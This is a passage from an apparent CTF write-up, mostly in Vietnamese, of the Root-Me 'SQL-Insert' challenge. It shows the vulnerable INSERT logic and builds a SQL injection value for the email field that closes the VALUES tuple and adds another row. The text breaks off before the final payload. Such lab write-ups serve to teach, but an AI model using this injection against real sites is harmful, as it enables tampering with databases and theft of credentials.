# SQL-Insert

Point: 40

Request Insert: fun & profit

Statement: Retrieve the flag

Related ressource: [SQL injection in insert, update and delete statements](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20SQL%20injection%20in%20insert,%20update%20and%20delete%20statements.pdf?_gl=1*jggomy*_ga*MTE0NDg5MTA5LjE2Nzk2MzIzMDY.*_ga_SRYSKX09J7*MTY4MjEyODY5NS41OC4xLjE2ODIxMjk4MzIuMC4wLjA.)

# Overview:

Form của challenge

![image](https://user-images.githubusercontent.com/115911041/233762097-617dc631-2eb0-46a2-8ee2-84c14a9ab232.png)

Challenge lần này cung cấp ta một form đăng kí và đăng nhập.Lấy được password admin là có được flag

Tên đề của bài này là INSERT, thì mình nghĩ sẽ có lien quan đến phần đăng kí

# Solution:

Đầu tien, tạo 1  account sau đó đi đăng nhập

 ```
 Username: admin
 Password: 123123
 Email: admin@gmail.com
 ```
![image](https://user-images.githubusercontent.com/115911041/233773209-e4fa2799-c554-4240-bb72-f66bb9bdb06c.png)

Kết quả hiển thị ra username và email. Ta có thể khai thác SQL ở phần này.Giờ mình sẽ thử giả lập lại phần đăng kí 

```
$username = $POST_['username'];
$password = $POST_['password'];
$email = $POST_['email'];

INSERT INTO example_table VALUES('$username','$password','$email');
```

Mình đã có thử một vài payload ở username thì nó bị filter nên mình sẽ chuyển sang email để khai thác.

Mình đã có đọc doc và nghiên cứu. Phát hiện ra mình có thể chèn payload kiểu như thế này

`INSERT INTO example_table (a,b,c) VALUES ('a','b','c'),('d','e','f')`

Mình sẽ thử mô phỏng cho các bạn dễ hiểu hơn 

```
$username = admin
$password = 123123
$email = c'),('d','e','f') -- -

INSERT INTO example_table (a,b,c) VALUES ('a','b','c'),('d','e','f') -- -
```

Vậy thì ta sẽ có công thức payload như sau
`email'),('username', 'password', 'payload') -- -`

Sau khi đã có phương pháp giải rồi, mình tạo 1 account mới với paload như trên

```
Username = admin1
Password = 123123123
email = 
